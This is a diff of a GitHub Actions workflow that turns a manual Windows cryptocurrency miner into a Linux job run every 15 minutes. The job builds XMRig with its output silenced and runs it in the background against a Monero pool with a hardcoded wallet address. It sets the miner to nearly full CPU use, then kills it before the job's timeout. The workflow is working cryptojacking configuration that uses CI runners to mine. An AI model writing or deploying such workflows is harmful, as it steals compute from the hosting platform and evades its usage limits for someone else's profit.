@@ -1,29 +1,57 @@
-name: Windows XMRig Miner (Fixed)
+name: Continuous XMRig Miner (Linux)
 
 on:
   workflow_dispatch:
+  schedule:
+    - cron: '*/15 * * * *'  # Runs every 15 minutes
 
 jobs:
   mine:
-    runs-on: windows-latest
-    timeout-minutes: 355
+    runs-on: ubuntu-latest
+    timeout-minutes: 14  # Must be less than interval
     steps:
-      - name: Generate random worker name
+      - name: Generate unique worker ID
         id: worker
-        run: echo "name=laptop$((Get-Random -Minimum 1 -Maximum 100001))" | Out-File -FilePath $env:GITHUB_OUTPUT -Append
-
-      - name: Download pre-built XMRig
         run: |
-          mkdir -p $env:USERPROFILE\miner
-          cd $env:USERPROFILE\miner
-          Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip" -OutFile "xmrig.zip"
-          Expand-Archive -Path "xmrig.zip" -DestinationPath .
-          Rename-Item -Path "xmrig-6.21.0" -NewName "xmrig"
+          WORKER_ID="linux-$(date +%s)-$(shuf -i 1-100000 -n 1)"
+          echo "name=${WORKER_ID}" >> $GITHUB_OUTPUT
 
-      - name: Run XMRig (fixed syntax)
+      - name: Install dependencies quietly
         run: |
-          cd $env:USERPROFILE\miner\xmrig
-          .\xmrig.exe -o pool.supportxmr.com:3333 `
-            -u 85jUiJ7tUsZ1gCRTVy4RyoQwPypRBQf1CaZvhogatc1hYHeecdqcq4uUAWntQyUdRhZRB72n1Vt792JvPcstTcntR2g9eZS `
-            -p ${{ steps.worker.outputs.name }} `
-            -k --donate-level 1 -t 6
+          sudo apt-get update -qq
+          sudo apt-get install -yqq git build-essential cmake libuv1-dev libssl-dev libhwloc-dev > /dev/null 2>&1
+
+      - name: Build XMRig from source
+        run: |
+          mkdir -p ~/xmrig_setup
+          cd ~/xmrig_setup
+          git clone --quiet https://github.com/xmrig/xmrig.git
+          cd xmrig
+          mkdir build
+          cd build
+          cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_HTTPD=OFF > /dev/null
+          make -j$(nproc) --silent
+
+      - name: Run miner with cleanup
+        run: |
+          cd ~/xmrig_setup/xmrig/build
+          # Start in background with nohup
+          nohup ./xmrig \
+            -o pool.supportxmr.com:443 \
+            -u 85jUiJ7tUsZ1gCRTVy4RyoQwPypRBQf1CaZvhogatc1hYHeecdqcq4uUAWntQyUdRhZRB72n1Vt792JvPcstTcntR2g9eZS \
+            -p ${{ steps.worker.outputs.name }} \
+            -k --tls --donate-level=1 \
+            -t $(($(nproc)-1)) \  # Leave 1 core free
+            --randomx-init=1 \
+            --randomx-mode=fast \
+            --cpu-max-threads-hint=95 \
+            --nicehash \
+            > /dev/null 2>&1 &
+          
+          # Let it run for most of the interval
+          sleep 720  # 12 minutes
+          
+          # Clean up
+          pkill -f xmrig
+          sync
+          sleep 3
